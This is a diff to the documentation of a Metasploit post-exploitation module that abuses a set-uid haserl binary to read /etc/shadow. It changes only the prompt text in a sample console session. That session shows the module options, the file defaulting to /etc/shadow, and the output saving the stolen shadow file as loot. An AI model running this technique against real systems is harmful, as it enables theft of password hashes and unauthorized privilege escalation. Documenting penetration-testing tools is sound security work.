@@ -38,8 +38,8 @@ Remote file to download, defaults to `/etc/shadow`.
 ## Scenarios
 
 ```
-msf6 > use post/linux/gather/haserl_read 
-msf6 post(linux/gather/haserl_read) > show options 
+msf > use post/linux/gather/haserl_read 
+msf post(linux/gather/haserl_read) > show options 
 
 Module options (post/linux/gather/haserl_read):
 
@@ -48,13 +48,13 @@ Module options (post/linux/gather/haserl_read):
    RFILE    /etc/shadow             yes       File to read
    SESSION  1                       yes       The session to run this module on.
 
-msf6 post(linux/gather/haserl_read) > run
+msf post(linux/gather/haserl_read) > run
 
 [!] SESSION may not be compatible with this module.
 [+] Found set-uid haserl: /usr/bin/haserl-lua53
 [+] Shadow saved in: /home/user/.msf4/loot/20210301204020_default_192.168.138.113_haserl_shadow_107368.txt
 [*] Post module execution completed
-msf6 post(linux/gather/haserl_read) >
+msf post(linux/gather/haserl_read) >
 ```
 
 ## Reference
